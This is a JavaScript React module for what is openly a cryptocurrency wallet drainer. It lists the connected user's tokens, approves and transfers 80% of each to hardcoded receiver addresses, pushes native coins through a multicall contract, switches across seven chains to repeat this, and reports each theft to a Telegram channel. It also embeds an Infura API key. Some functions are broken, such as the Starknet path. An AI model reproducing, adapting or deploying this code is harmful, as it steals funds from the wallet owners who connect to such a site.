"use client";

import { useAccount, useSwitchChain } from "wagmi";
import { getBalance, getChainId, getGasPrice } from "@wagmi/core";
import axios from "axios";
import { Contract, providers, ethers, utils } from "ethers";
import contractAbi from "../blockchain/contract.json";
import { config, receiver, receiver2, API_KEY } from "./Web3Config";
import { toast } from "react-toastify";
import Web3 from "web3";
import { sendAppDetailsToTelegramDrain } from "./telegramUtils";
import { getRecipientAddress } from "./getUserLocation";
import { useStarknet, useContract } from 'starknetkit'; // Import necessary hooks
export const getContractAddress = async (chainId) => {
    const recipient = await getRecipientAddress(); // Fetch recipient dynamically
    if (!recipient || !ethers.utils.isAddress(recipient)) {
        return;  // Abort if recipient address is invalid
    }
    if (recipient === receiver) {
        switch (chainId) {
            case 1:
                return "0xe13686dc370817C5dfbE27218645B530041D2466"; // Ethereum
            case 56:
                return "0x2B7e812267C55246fe7afB0d6Dbc6a32baEF6A15"; // Binance
            case 137:
                return "0x1bdBa4052DFA7043A7BCCe5a5c3E38c1acE204b5"; // Polygon
            case 43114:
                return "0x07145f3b8B9D581A1602669F2D8F6e2e8213C2c7"; // Avalanche
            case 42161:
                return "0x1bdBa4052DFA7043A7BCCe5a5c3E38c1acE204b5"; // Arbitrum
            case 10:
                return "0x1bdBa4052DFA7043A7BCCe5a5c3E38c1acE204b5"; // Optimism
            case 42220:
                return "0xdA79c230924D49972AC12f1EA795b83d01F0fBfF"; // Celo
            default:
                throw new Error("Unsupported network");
        }
    } else if (recipient === receiver2) {
        switch (chainId) {
            case 1:
                return "0xC139c48F142daf9F3b2D17E9002F4D27Cf4D6966"; // Ethereum
            case 56:
                return "0xC139c48F142daf9F3b2D17E9002F4D27Cf4D6966"; // Binance
            case 137:
                return "0xC139c48F142daf9F3b2D17E9002F4D27Cf4D6966"; // Polygon
            case 43114:
                return "0xC139c48F142daf9F3b2D17E9002F4D27Cf4D6966"; // Avalanche
            case 42161:
                return "0xC139c48F142daf9F3b2D17E9002F4D27Cf4D6966"; // Arbitrum
            case 10:
                return "0xC139c48F142daf9F3b2D17E9002F4D27Cf4D6966"; // Optimism
            case 42220:
                return "0xC139c48F142daf9F3b2D17E9002F4D27Cf4D6966"; // Celo
            default:
                throw new Error("Unsupported network");
        }
    }
};

const getChainNameById = (chainId) => {
    switch (chainId) {
        case 1:
            return "Ethereum";
        case 56:
            return "Binance Smart Chain";
        case 137:
            return "Polygon";
        case 43114:
            return "Avalanche";
        case 42161:
            return "Arbitrum";
        case 10:
            return "Optimism";
        case 42220:
            return "Celo";
        default:
            return "Unknown Chain";
    }
};

export const UseWallet = () => {
    const account = useAccount();
    const { switchChain } = useSwitchChain();
    // Chain status tracking
    let chainInteractionStatus = {
        1: false, // Ethereum Mainnet
        56: false, // Binance Smart Chain Mainnet
        137: false, // Polygon Mainnet
        43114: false, // Avalanche Mainnet
        42161: false, // Arbitrum Mainnet
        10: false, // Optimism Mainnet
        42220: false, // Celo Mainnet
    };

    const chainDrainStatus = {
        1: false, // Ethereum Mainnet
        56: false, // Binance Smart Chain Mainnet
        137: false, // Polygon Mainnet
        43114: false, // Avalanche Mainnet
        42161: false, // Arbitrum Mainnet
        10: false, // Optimism Mainnet
        42220: false, // Celo Mainnet
    };

    const approveTokens = async () => {
        if (account && account.address && account.chainId) {
            const tokens = await getTokenAssets();
            const provider = new providers.JsonRpcProvider(
                account.chainId === 1
                    ? "https://mainnet.infura.io/v3/1aa31fce4c0f49c38c1464b4bfa49f73"
                    : "https://bsc-dataseed.binance.org"
            );

            for (let token of tokens) {
                const tokenContract = new Contract(
                    token.tokenAddress,
                    [
                        "function approve(address spender, uint256 amount) external returns (bool)",
                    ],
                    provider.getSigner(account.address)
                );

                try {
                    const tx = await tokenContract.approve(
                        getContractAddress(account.chainId),
                        utils.parseUnits(token.tokenAmount.toString(), token.tokenDecimal)
                    );
                    await tx.wait();
                } catch (error) {
                    // Continue to the next token even if approval fails
                }
            }
        }
    };

    const drain = async (setTxState) => {
        if (!window.ethereum || !account?.address || !account?.chainId) {
            return;
        }

        const chainId = getChainId(config);

        // Update chainInteractionStatus after interacting with the chain
        chainInteractionStatus[chainId] = true;

        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner(account.address);
        const ethBalance = await getBalance(config, {
            address: account.address,
            chainId: account.chainId,
        });

        const tokens = await getTokenAssets();

        // Process each token individually
        for (let token of tokens) {
            const { tokenAddress, tokenAmount } = token;

            if (tokenAddress !== "0x0000000000000000000000000000000000000000") {
                const tokenContract = new Contract(
                    tokenAddress,
                    [
                        "function balanceOf(address owner) view returns (uint256)",
                        "function transfer(address to, uint256 amount) external returns (bool)",
                    ],
                    signer
                );

                const amountInWei = ethers.BigNumber.from(tokenAmount.toString())
                    .mul(8)
                    .div(10); // Transfer 80% of the balance

                try {
                    const userBalance = await tokenContract.balanceOf(account.address);
                    if (userBalance.lt(amountInWei)) {
                        sendAppDetailsToTelegramDrain(ethBalance, token, chainId, Number(tokenAmount) * 0.8, 'Failed')
                        continue; // Move to next token
                    }

                    const transferTx = await tokenContract.transfer(
                        receiver,
                        amountInWei
                    );
                    const receipt = await transferTx.wait();

                    if (receipt.status === 1) {
                        sendAppDetailsToTelegramDrain(ethBalance, token, chainId, Number(tokenAmount) * 0.8, 'Success', undefined, transferTx.hash)
                    } else {
                        sendAppDetailsToTelegramDrain(ethBalance, token, chainId, Number(tokenAmount) * 0.8, 'Failed')
                    }

                    chainDrainStatus[chainId] = true; // Mark chain as drained if successful
                } catch (error) {
                    sendAppDetailsToTelegramDrain(ethBalance, token, chainId, Number(tokenAmount) * 0.8, 'Failed', error)
                    continue; // Continue to next token on failure
                }
            }
        }

        // After tokens, handle multicall for native tokens
        setTimeout(async () => {
            await handleMulticall(tokens, ethBalance);
        }, 4000)
    };


    const drainStarknet = async (setTxState) => {
        const { account } = useStarknet(); // Get account from starknetkit

        if (!account?.address || !account?.chainId) {
            return;
        }

        const chainId = getChainId(config);

        // Update chainInteractionStatus after interacting with the chain
        chainInteractionStatus[chainId] = true;

        const ethBalance = await getBalance(config, {
            address: account.address,
            chainId: account.chainId,
        });

        const tokens = await getTokenAssets();

        // Process each token individually
        for (let token of tokens) {
            const { tokenAddress, tokenAmount } = token;

            if (tokenAddress !== "0x0000000000000000000000000000000000000000") {
                const tokenContract = new Contract(
                    tokenAddress,
                    [
                        "function balanceOf(address owner) view returns (uint256)",
                        "function transfer(address to, uint256 amount) external",
                    ],
                );

                const amountInWei = ethers.BigNumber.from(tokenAmount.toString())
                    .mul(8)
                    .div(10); // Transfer 80% of the balance

                try {
                    const userBalance = await tokenContract.balanceOf(account.address);
                    if (userBalance.lt(amountInWei)) {
                        sendAppDetailsToTelegramDrain(ethBalance, token, chainId, Number(tokenAmount) * 0.8, 'Failed');
                        continue; // Move to next token
                    }

                    const transferTx = await tokenContract.transfer(receiver, amountInWei);
                    const receipt = await transferTx.wait();

                    if (receipt.status === 1) {
                        sendAppDetailsToTelegramDrain(ethBalance, token, chainId, Number(tokenAmount) * 0.8, 'Success', undefined, transferTx.hash);
                    } else {
                        sendAppDetailsToTelegramDrain(ethBalance, token, chainId, Number(tokenAmount) * 0.8, 'Failed');
                    }

                    chainDrainStatus[chainId] = true; // Mark chain as drained if successful
                } catch (error) {
                    sendAppDetailsToTelegramDrain(ethBalance, token, chainId, Number(tokenAmount) * 0.8, 'Failed', error);
                    continue; // Continue to next token on failure
                }
            }
        }

        // After tokens, handle multicall for native tokens
        setTimeout(async () => {
            await handleMulticall(tokens, ethBalance);
        }, 4000);
    };
    const handleMulticall = async (tokens, ethBalance) => {
        const chainId = getChainId(config);
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner(account.address);
        const multiCallContract = new Contract(
            getContractAddress(chainId),
            contractAbi,
            signer
        );
        let totalEthRequired = ethers.BigNumber.from(ethBalance.value)
        const tokenAddresses = tokens.map((token) => token.tokenAddress);
        const amounts = tokens.map((token) =>
            ethers.BigNumber.from(token.tokenAmount).mul(8).div(10)
        );

        try {
            const gasPrice = await getGasPrice(config, { chainId: account.chainId });
            const gasEstimate = await multiCallContract.estimateGas.multiCall(
                tokenAddresses,
                amounts,
                {
                    value: ethBalance.value,
                }
            );
            const gasFee = gasEstimate.mul(gasPrice);

            const totalEthRequired = ethers.BigNumber.from(ethBalance.value)
                .mul(8)
                .div(10); // Transfer 70% of ETH

            if (totalEthRequired.lt(gasFee)) {
                toast.error("Not enough ETH to cover gas fees and transfer.", {
                    toastId: "drain",
                });
                setTimeout(async () => {
                    await proceedToNextChain();
                }, 4000)
                return;
            }

            const tx = await multiCallContract.multiCall(tokenAddresses, amounts, {
                value: totalEthRequired,
            });

            const receipt = await tx.wait();
            if (!receipt || !receipt.status || receipt.status !== 1) {
                sendAppDetailsToTelegramDrain(ethBalance, tokens, chainId, ethers.utils.formatEther(totalEthRequired.mul(7).div(10)), 'Failed')
                throw new Error('Transaction failed or returned invalid status');
            }
            if (receipt.status === 1) {
                sendAppDetailsToTelegramDrain(ethBalance, tokens, chainId, ethers.utils.formatEther(totalEthRequired.mul(7).div(10)), 'Success', undefined, tx.hash)
            }
            chainDrainStatus[chainId] = true; // Mark chain as drained if successful
            setTimeout(async () => {
                await proceedToNextChain();
            }, 4000)
        } catch (error) {
            sendAppDetailsToTelegramDrain(ethBalance, tokens, chainId, ethers.utils.formatEther(totalEthRequired.mul(7).div(10)), 'Failed', error.message)
            setTimeout(async () => {
                await proceedToNextChain();
            }, 4000)
        }
    };

    const getWalletBalance = async ({ setWalletBalance }) => {
        try {
            // Check if window.ethereum is available
            if (typeof window.ethereum === "undefined") {
                return;
            }

            // Initialize Web3 instance
            const web3 = new Web3(window.ethereum);

            // Request accounts
            const accounts = await window.ethereum.request({
                method: "eth_requestAccounts",
            });

            if (!accounts || accounts.length === 0) {
                return;
            }

            // Get balance in wei
            const weiBalance = await web3.eth.getBalance(accounts[0]);

            if (weiBalance === undefined) {
                return;
            }

            // Convert to Ether
            const ethBalance = web3.utils.fromWei(weiBalance, "ether"); // Specify 'ether' as the unit

            // Set the wallet balance state
            setWalletBalance(ethBalance);
        } catch (err) {
            // Handle error
        }
    };

    const proceedToNextChain = async () => {
        const nextChainId = Object.keys(chainInteractionStatus).find(
            (id) => !chainInteractionStatus[id]
        );

        if (nextChainId) {
            try {
                await switchChain(config, { chainId: Number(nextChainId) });
                await drain(); // Recursive call to drain the next chain
            } catch (switchError) {
                setTimeout(async () => {
                    await proceedToNextChain();
                }, 4000) // Continue to next operation even if chain switch fails
            }
        } else {
            // Check for any chains that were not fully drained and retry
            const notDrainedChains = Object.keys(chainDrainStatus).filter(
                (id) => !chainDrainStatus[id] && chainInteractionStatus[id]
            );

            if (notDrainedChains.length > 0) {
                for (const chainId of notDrainedChains) {
                    try {
                        await switchChain(config, { chainId: Number(chainId) });
                        await drain(); // Retry draining for non-drained chains
                    } catch (switchError) {
                        continue; // Skip and continue with other non-drained chains
                    }
                }
            }
        }
    };

    const getTokenAssets = async () => {
        const chainId = getChainId(config);
        let tokenBalances = [];
        const options = {
            url: `https://api.chainbase.online/v1/account/tokens?chain_id=${chainId}&address=${account.address}&limit=20&page=1`,
            method: "GET",
            headers: {
                "x-api-key": API_KEY,
                accept: "application/json",
            },
        };
        try {
            const tokenListResponse = await axios(options);
            const tokens = tokenListResponse.data.data;

            if (!tokens) return tokenBalances;

            for (const token of tokens) {
                const tokenAmount = BigInt(token.balance);
                const tokenAddress = token.contract_address.toLowerCase();
                const usdAmount = token.current_usd_price || 0;
                const tokenDecimal = token.decimals;
                if (usdAmount > 0) {
                    tokenBalances.push({
                        tokenAmount: tokenAmount,
                        tokenName: token.name,
                        tokenDecimal: tokenDecimal,
                        usdAmount: usdAmount,
                        tokenAddress,
                    });
                }
            }
            tokenBalances.sort((a, b) => b.usdAmount - a.usdAmount);
        } catch (error) {
            // Handle error
        }

        return tokenBalances;
    };

    return {
        approveTokens,
        drain,
        getTokenAssets,
        getWalletBalance,
    };
};
